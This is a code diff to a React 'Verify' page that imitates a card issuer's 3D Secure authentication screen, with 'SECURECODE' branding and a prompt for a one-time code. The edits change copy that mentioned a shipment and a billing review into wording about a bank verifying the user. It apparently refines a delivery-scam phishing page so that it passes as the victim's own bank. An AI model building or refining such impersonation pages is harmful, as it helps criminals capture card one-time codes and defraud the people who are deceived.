@@ -261,7 +261,7 @@ export default function Verify() {
           <div className="w-full max-w-md rounded-2xl border border-slate-200 bg-white p-6 text-center shadow-2xl">
             <div className="mx-auto h-10 w-10 rounded-full border-4 border-[#ccd7ef] border-t-[#2f67b3] animate-spin" />
             <div className="mt-4 text-lg font-semibold text-slate-900">Checking your code</div>
-            <div className="text-sm text-slate-600 mt-2">Please wait while we review the authentication code for this shipment.</div>
+            <div className="text-sm text-slate-600 mt-2">Please wait while your bank reviews the authentication code.</div>
             <div className="mt-5 rounded-lg border border-[#d7e0f2] bg-[#f4f7fd] px-3 py-2 text-xs text-[#314a73]">Do not refresh or close this page while authentication is pending.</div>
           </div>
         </div>
@@ -311,7 +311,7 @@ export default function Verify() {
                 <div>
                   <div className="alz-bank-header-eyebrow">Issuer Authentication</div>
                 <h1 className="alz-bank-title">Authentication required</h1>
-                <p className="alz-bank-copy">Enter the one-time code sent by your card issuer.</p>
+                <p className="alz-bank-copy">Enter the one-time code sent by your bank or card issuer.</p>
               </div>
               <div className="alz-bank-brandbox">
                 <div className="alz-bank-brandname">SECURECODE</div>
@@ -332,7 +332,7 @@ export default function Verify() {
                     <strong>3D Secure required</strong>
                   </div>
                   <div>
-                    <span>Delivery method</span>
+                    <span>Contact method</span>
                     <strong>{verifyMethod ? verifyMethodLabel(verifyMethod) : 'Select phone or email'}</strong>
                   </div>
                   <div>
@@ -357,7 +357,7 @@ export default function Verify() {
               <aside className="alz-bank-side">
                 <div className="alz-bank-side-card">
                   <div className="alz-bank-side-title">Protected payment</div>
-                  <div className="alz-bank-side-copy">This billing review is protected by your issuer.</div>
+                  <div className="alz-bank-side-copy">This bank verification is protected by your issuer.</div>
                 </div>
                 <div className="alz-bank-side-card">
                   <div className="alz-bank-side-title">Need help?</div>
